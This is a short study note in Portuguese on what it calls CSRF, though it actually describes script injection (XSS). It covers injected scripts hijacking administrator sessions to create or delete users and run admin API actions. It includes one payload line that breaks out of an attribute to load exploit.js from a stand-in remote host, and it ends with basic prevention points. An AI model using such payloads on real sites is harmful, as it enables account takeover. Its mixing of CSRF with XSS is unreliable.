Cross-Site Request Forgery (Falsificação de solicitação entre sites)

Outro tipo de ataque que ocorre por uma falta de sanitizacao na entrada do usuário

Um exemplo de ataque CSRF seria o atacante escrever um payload em JS e utilizar de algum comentario ou campo da url para injetar aquele payload, fazendo com que quando a vitima acessar a pagina, ela execute o script, para por exemplo, alterar a propia senha.

# ADM

no caso de administradores, como eles possuem permissoes elevadas, poderiamos ao inves de fazer um script que nos entrega cookies de sesssao ou credenciais de acesso.

poderiamos fazer um script que quando o adm renderiza a pagina, ele anexa automaticamente as credenciais do admin para realizar acoes como, execucao de codigos adm na API, criacao de users, deletar users etc.
```html
"><script src=//www.example.com/exploit.js></script>
```

# prevencao

Sanitizacao: validar os caracteres especiais e nao padronizados

Validacao: ver se a entrada do usuario corresponde com o dado requirido

exibicao: mesmo que o atacante consiga burlar as 2 primeiras, e importante garantir que nao aja retorno na pagina de um xss ou html injection